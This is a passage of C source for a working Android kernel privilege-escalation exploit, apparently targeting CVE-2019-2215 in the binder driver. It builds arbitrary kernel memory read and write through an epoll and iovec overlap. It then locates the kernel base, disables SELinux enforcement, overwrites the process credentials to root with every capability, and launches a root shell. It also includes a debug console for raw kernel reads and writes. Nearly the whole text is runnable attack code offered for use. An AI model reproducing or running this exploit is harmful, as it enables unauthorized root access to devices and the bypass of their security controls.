    current = *(u64 *)(page_buffer + 0xe8);
}
void obtain_kernel_rw(void) {
    /* Originally: void clobber_addr_limit(void); */
    struct epoll_event event = {.events = EPOLLIN};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &event))
        err(1, "epoll_add");

    binder_iovecs bio;
    memset(&bio, 0, sizeof(bio));
    bio.iovs[iov_idx].iov_base = dummy_page;             /* spinlock in the low address half must be zero */
    bio.iovs[iov_idx].iov_len = 1;                       /* wq->task_list->next */
    bio.iovs[iov_idx + 1].iov_base = (void *)0xdeadbeef; /* wq->task_list->prev */
    bio.iovs[iov_idx + 1].iov_len = 0x8 + 2 * 0x10;      /* iov_len of previous, then this element and next element */
    bio.iovs[iov_idx + 2].iov_base = (void *)0xbeefdead;
    bio.iovs[iov_idx + 2].iov_len = 8; /* should be correct from the start, kernel will sum up lengths when importing */

    u64 second_write_chunk[] = {
        1,                 /* iov_len */
        0xdeadbeef,        /* iov_base (already used) */
        0x8 + 2 * 0x10,    /* iov_len (already used) */
        current + 0x8,     /* next iov_base (addr_limit) */
        8,                 /* next iov_len (sizeof(addr_limit)) */
        0xfffffffffffffffe /* value to write */
    };

    int socks[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks))
        err(1, "socketpair");
    if (write(socks[1], "X", 1) != 1)
        err(1, "write socket dummy byte");

    pid = fork();
    if (pid == -1)
        err(1, "fork");
    if (pid == 0) {
        /* Child process */
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        sleep(2);
        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, binder_fd, &event);
        size_t write_sz = sizeof(second_write_chunk);
        if (write(socks[1], second_write_chunk, write_sz) != (ssize_t)write_sz)
            err(1, "write second chunk to socket");
        exit(0);
    }

    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    struct msghdr msg = {.msg_iov = bio.iovs, .msg_iovlen = iovs_sz};
    size_t recvmsg_sz = bio.iovs[iov_idx].iov_len +
                        bio.iovs[iov_idx + 1].iov_len +
                        bio.iovs[iov_idx + 2].iov_len;
    ssize_t recvmsg_ret = recvmsg(socks[0], &msg, MSG_WAITALL);
    if (recvmsg_ret != (ssize_t)recvmsg_sz)
        errx(1, "recvmsg() returns %ld, expected %lu\n", recvmsg_ret, recvmsg_sz);

    setbuf(stdout, NULL);
}
void find_kernel_base(void) {
    u64 current_mm = kread_u64(current + offsetof(struct task_struct, mm));
    u64 current_user_ns = kread_u64(current_mm + offsetof(struct mm_struct, user_ns));
    kernel_base = current_user_ns - ksym_init_user_ns;
    if (kernel_base & 0xffful) {
        if (debugging) {
            warnx("bad kernel base (not 0x...000)");
            kernel_base = 0;
            return;
        } else {
            errx(1, "bad kernel base (not 0x...000)");
        }
    }

    u64 init_task = kernel_base + ksym_init_task;
    u64 cred_ptrs[2] = {
        kread_u64(init_task + offsetof(struct task_struct, real_cred)), /* init_task.real_cred */
        kread_u64(init_task + offsetof(struct task_struct, cred)),      /* init_task.cred */
    };

    /* Examine what we think are the init process' credentials.
     * Presumably, these tests are unlikely to pass unless we have the right
     * kernel base, kernel symbol offsets, and kernel data structure offsets.
     */
    for (int cred_idx = 0; cred_idx < 2; cred_idx++) {
        struct cred cred;
        kread(cred_ptrs[cred_idx], &cred, sizeof(struct cred));

        if (cred.uid || cred.gid || cred.suid || cred.sgid ||
            cred.euid || cred.egid || cred.fsuid || cred.fsgid) {
            if (debugging) {
                warnx("bad kernel base (init_task not where expected)");
                kernel_base = 0;
                return;
            } else {
                errx(1, "bad kernel base (init_task not where expected)");
            }
        }

        const u64 cap = 0x3fffffffff;
        if (cred.cap_inheritable || cred.cap_permitted != cap ||
            cred.cap_effective != cap || cred.cap_bset != cap ||
            cred.cap_ambient) {
            if (debugging) {
                warnx("bad kernel base (init_task not where expected)");
                kernel_base = 0;
                return;
            } else {
                errx(1, "bad kernel base (init_task not where expected)");
            }
        }

        /* .real_cred == .cred, probably. */
        if (cred_ptrs[0] == cred_ptrs[1])
            break;
    }
}
void patch_creds(void) {
    u64 cred_ptrs[2] = {
        kread_u64(current + offsetof(struct task_struct, real_cred)), /* current->real_cred */
        kread_u64(current + offsetof(struct task_struct, cred)),      /* current->cred */
    };

    /* Final check: our struct cred(s?) in the kernel should contain our uid. */
    if (kread_u32(cred_ptrs[0] + offsetof(struct cred, uid)) != getuid())
        errx(1, "bad cred (current->real_cred->uid not our own uid)");
    if (cred_ptrs[0] != cred_ptrs[1])
        if (kread_u32(cred_ptrs[1] + offsetof(struct cred, uid)) != getuid())
            errx(1, "bad cred (current->cred->uid not our own uid)");

    /* Just disabling selinux_enforcing should suffice for our purposes. SELinux
     * still does MAC (mandatory access control) checks on our actions based on
     * our security contexts, but violations are logged, not prevented. Our
     * permissions then fall back to DAC (discretionary access control), i.e.
     * user accounts/groups. And as we know, the root user is DAC omnipotent.
     */
    // kwrite_u32(kernel_base + ksym_selinux_enabled, 0);
    kwrite_u32(kernel_base + ksym_selinux_enforcing, 0);

    /* Patch our struct cred(s?) in the kernel. */
    for (int cred_idx = 0; cred_idx < 2; cred_idx++) {
        u64 cred_ptr = cred_ptrs[cred_idx];

        /* All 8 (e|f?s)?[ug]id members should be set to 0, making us root. */
        kwrite_u32(cred_ptr + offsetof(struct cred, uid), 0);
        kwrite_u32(cred_ptr + offsetof(struct cred, gid), 0);
        kwrite_u32(cred_ptr + offsetof(struct cred, suid), 0);
        kwrite_u32(cred_ptr + offsetof(struct cred, sgid), 0);
        kwrite_u32(cred_ptr + offsetof(struct cred, euid), 0);
        kwrite_u32(cred_ptr + offsetof(struct cred, egid), 0);
        kwrite_u32(cred_ptr + offsetof(struct cred, fsuid), 0);
        kwrite_u32(cred_ptr + offsetof(struct cred, fsgid), 0);

        /* What to do with securebits is not as obvious. The comment for it in
         * the kernel source reads 'SUID-less security management'. In the init
         * process' cred(s?), this is set to 0, so we might as well do the same.
         */
        kwrite_u32(cred_ptr + offsetof(struct cred, securebits), 0);

        /* All 5 cap_.+ members should be bitset to all 1's. We will have all
         * capability bits set, and our children will be able to inherit them.
         */
        kwrite_u64(cred_ptr + offsetof(struct cred, cap_inheritable), ~(u64)0);
        kwrite_u64(cred_ptr + offsetof(struct cred, cap_permitted), ~(u64)0);
        kwrite_u64(cred_ptr + offsetof(struct cred, cap_effective), ~(u64)0);
        kwrite_u64(cred_ptr + offsetof(struct cred, cap_bset), ~(u64)0);
        kwrite_u64(cred_ptr + offsetof(struct cred, cap_ambient), ~(u64)0);

        /* Also patch our task_security_struct(s?). This is not necessary with
         * SELinux bypassed, but we will again match init's settings and set
         * the osid and sid members to 1.
         */
        u64 security_ptr = kread_u64(cred_ptr + offsetof(struct cred, security));
        kwrite_u32(security_ptr + offsetof(struct task_security_struct, osid), 1);
        kwrite_u32(security_ptr + offsetof(struct task_security_struct, sid), 1);

        /* .real_cred == .cred, probably. */
        if (cred_ptrs[0] == cred_ptrs[1])
            break;
    }

    if (getuid())
        errx(1, "did some patching, but our uid is not 0");
}
void launch_shell(void) {
    if (execl("/bin/sh", "/bin/sh", (char *)NULL) == -1)
        err(1, "launch shell");
}
void launch_debug_console(void) {
    printf("launching debug console; enter 'help' for quick help\n");
    con_loop();
}

void con_loop(void) {
    u64 kaddr;
    size_t len;

    int running = 1;
    while (running) {
        printf("debug> ");

        char *line = NULL;
        size_t getline_buf_len = 0;
        if (getline(&line, &getline_buf_len, stdin) == -1)
            err(1, "read stdin");
        int was_handled = 0;

        char *token = strtok(line, " \t\r\n\a");
        if (token && !strcmp(token, "print") && con_consume(&token)) {
            printf("%lx kernel_base\n", kernel_base);
            printf("%lx init_task\n", kernel_base + ksym_init_task);
            printf("%lx init_user_ns\n", kernel_base + ksym_init_user_ns);
            printf("%lx selinux_enabled\n", kernel_base + ksym_selinux_enabled);
            printf("%lx selinux_enforcing\n", kernel_base + ksym_selinux_enforcing);
            printf("%lx current\n", current);
            was_handled = 1;
        } else if (token && !strcmp(token, "read")) {
            /* Not that there'd actually be any kmem allocated there, but if the
             * read address were 0xffffffffffffffff, we'd technically be able to
             * read exactly one byte. We ~do~ want to handle that case... right?
             */
            if (con_parse_hexstring(strtok(NULL, " \t\r\n\a"), &kaddr) &&
                con_parse_number(strtok(NULL, " \t\r\n\a"), &len) &&
                con_consume(&token) && 0 < len && len <= PAGE_SIZE &&
                len - 1 <= ~(u64)0 - kaddr) {
                con_kdump(kaddr, len);
                was_handled = 1;
            }
        } else if (token && !strcmp(token, "write")) {
            u8 *data = NULL;
            if (con_parse_hexstring(strtok(NULL, " \t\r\n\a"), &kaddr) &&
                con_parse_hexbytes(&token, &data, &len) && 0 < len &&
                len <= PAGE_SIZE && len - 1 <= ~(u64)0 - kaddr) {
                kwrite(kaddr, data, len);
                was_handled = 1;
            }
            free(data);
        } else if (token && !strcmp(token, "shell") && con_consume(&token)) {
            pid = fork();
            if (pid == -1)
                err(1, "fork");
            if (pid == 0)
                launch_shell();
            pid_t status;
            do {
                waitpid(pid, &status, WUNTRACED);
            } while (!WIFEXITED(status) && !WIFSIGNALED(status));
            was_handled = 1;
        } else if (token && !strcmp(token, "help") && con_consume(&token)) {
            printf(
                "quick help\n"
                "    print\n"
                "        print kernel base address, some kernel symbol offsets,\n"
                "        and address of current task_struct as hexstrings\n"
                "    read <kaddr> <len>\n"
                "        read <len> bytes from <kaddr> and display as a hexdump\n"
                "        <kaddr> is a hexstring not prefixed with 0x\n"
                "        <len> is 1-4096 or 0x1-0x1000\n"
                "    write <kaddr> <data>\n"
                "        write <data> to <kaddr>\n"
                "        <kaddr> is a hexstring not prefixed with 0x\n"
                "        <data> is 1-4096 hexbytes, spaces ignored, to be written *AS-IS*\n"
                "        e.g. if kaddr 0xffffffffdeadbeef contains an int, and you want to set\n"
                "        its value to 1, enter 'write ffffffffdeadbeef <data>', where <data> is\n"
                "        '01000000', '0100 0000', '01 00 0 0 00', etc. (our ARM is little-endian)\n"
                "    shell\n"
                "        launch a shell (hint: have we ~somehow~ become another user? :P)\n"
                "    help\n"
                "        print this help\n"
                "    exit\n"
                "        exit debug console\n");
            was_handled = 1;
        } else if (token && !strcmp(token, "exit") && con_consume(&token)) {
            running = 0;
            was_handled = 1;
        }

        if (!was_handled)
            printf("woopz; enter 'help' for quick help\n");

        free(line);
    }
}
int con_consume(char **token) {
    int ret = 1;
    do {
        if ((*token = strtok(NULL, " \t\r\n\a")))
            ret = 0;
    } while (*token);
    return ret;
}
int con_parse_hexstring(char *token, u64 *val) {
    if (!token || !(*token))
        return 0;
    *val = 0;
    while (*token) {
        if (*val & 0xf000000000000000)
            return 0;
        else if ('0' <= *token && *token <= '9')
            *val = *val * 16 + *token - '0';
        else if ('a' <= *token && *token <= 'f')
            *val = *val * 16 + *token - 'a' + 10;
        else if ('A' <= *token && *token <= 'F')
            *val = *val * 16 + *token - 'A' + 10;
        else
            return 0;
        token++;
    }
    return 1;
}
int con_parse_number(char *token, u64 *val) {
    if (!token || !(*token))
        return 0;
    if (*token == '0' && (token[1] == 'x' || token[1] == 'X'))
        return con_parse_hexstring(token + 2, val);
    *val = 0;
    while (*token) {
        if (*token < '0' || '9' < *token)
            return 0;
        *val = *val * 10 + *token - '0';
        if (*val > PAGE_SIZE)
            return 0;
        token++;
    }
    return 1;
}
int con_parse_hexbytes(char **token, u8 **data, size_t *len) {
    static char hexbyte[2 + 1] = {'\0'};

    u8 *buf = malloc(PAGE_SIZE * sizeof(u8));
    if (!buf)
        err(1, "allocate memory");

    *data = buf;
    *len = 0;
    int hexbyte_idx = 0;

    while ((*token = strtok(NULL, " \t\r\n\a"))) {
        for (char *c = *token; *c; c++) {
            if (!isxdigit(*c))
                return 0;
            hexbyte[hexbyte_idx++] = *c;
            if (hexbyte_idx == 2) {
                hexbyte_idx = 0;
                u64 val;
                if (*len == PAGE_SIZE || !con_parse_hexstring(hexbyte, &val))
                    return 0;
                buf[(*len)++] = (u8)(val & 0xff);
            }
        }
    }

    return *len && !hexbyte_idx;
}
void con_kdump(u64 kaddr, size_t len) {
    /* Mimic the output of `xxd`. */
    static char line[40 + 1] = {'\0'};
    static char text[16 + 1] = {'\0'};

    if (!len)
        return;

    u8 *buf = malloc(len * sizeof(u8));
    if (!buf)
        err(1, "allocate memory");

    kread(kaddr, buf, len);

    for (u64 line_offset = 0; line_offset < len; line_offset += 16) {
        char *linep = line;
        for (size_t i = 0; i < 16; i++) {
            if (i + line_offset < len) {
                char c = buf[i + line_offset];
                linep += sprintf(linep, (i & 1) ? "%02x " : "%02x", c);
                text[i] = (' ' <= c && c <= '~') ? c : '.';
            } else {
                linep += sprintf(linep, (i & 1) ? "   " : "  ");
                text[i] = ' ';
            }
        }
        printf("%016lx: %s %s\n", kaddr + line_offset, line, text);
    }

    free(buf);
}

/* Excuse this mess; bionic libc doesn't have on_exit(). */
char *stage_desc;
struct stage_t {
    void (*func)(void);
    char *desc;
};
struct stage_t stages[] = {
    {prepare_globals, "startup"},
    {find_current, "find kernel address of current task_struct"},
    {obtain_kernel_rw, "obtain arbitrary kernel memory R/W"},
    {find_kernel_base, "find kernel base address"},
    {patch_creds, "bypass SELinux and patch current credentials"},
    {launch_shell, NULL},
    {launch_debug_console, NULL},
};
void execute_stage(int stage_idx) {
    stage_desc = stages[stage_idx].desc;
    (*stages[stage_idx].func)();
    if (stage_desc && pid && (stage_idx != 3 || kernel_base))
        printf("[+] %s\n", stage_desc);
}
void notify_stage_failure(void) {
    if (stage_desc && pid)
        fprintf(stderr, "[-] %s failed\n", stage_desc);
}

int main(int argc, char *argv[]) {
    atexit(notify_stage_failure);
    debugging = argc == 2 && !strcmp(argv[1], "debug");
    int probing = argc == 2 && !strcmp(argv[1], "probe");
    int scanning = argc == 2 && !strcmp(argv[1], "scan");
    int scanning_init = argc == 2 && !strcmp(argv[1], "scan-init");
    int dumping = argc == 2 && !strcmp(argv[1], "dump-aboot");
    int root_shell = argc == 2 && !strcmp(argv[1], "root-shell");
    int root_command = argc >= 3 && !strcmp(argv[1], "root-command");

    printf(" temporary root via CVE-2019-2215\n");

    execute_stage(0); /* prepare_globals() */
    execute_stage(1); /* find_current() */
    if ((current & 0xffff000000000000ULL) != 0xffff000000000000ULL)
        errx(1, "leaked current pointer is not canonical: 0x%016lx", current);
    printf("[i] current task_struct candidate: 0x%016lx\n", current);
    if (dumping) {
        dump_aboot_via_child();
        return 0;
    }
    if (root_shell || root_command) {
        temporary_root_shell(root_command ? argv[2] : NULL);
        return 0;
    }

    execute_stage(2); /* obtain_kernel_rw() */

    if (probing) {
        u8 sample[64];
        kread(current, sample, sizeof(sample));
        printf("[+] arbitrary kernel read succeeded\n");
        for (size_t i = 0; i < sizeof(sample); i += 16) {
            printf("%016lx:", current + i);
            for (size_t j = 0; j < 16; j++)
                printf(" %02x", sample[i + j]);
            putchar('\n');
        }
        return 0;
    }

    if (scanning) {
        scan_dynamic_creds();
        return 0;
    }

    if (scanning_init) {
        scan_init_sid();
        return 0;
    }


    execute_stage(3); /* find_kernel_base() */

    if (debugging) {
        if (!kernel_base) {
            notify_stage_failure();
            warnx("printed kernel offsets won't be reliable\n");
        }
        execute_stage(6); /* launch_debug_console() */
    } else {
        execute_stage(4); /* patch_creds() */
        execute_stage(5); /* launch_shell() */
    }

    return 0;
}
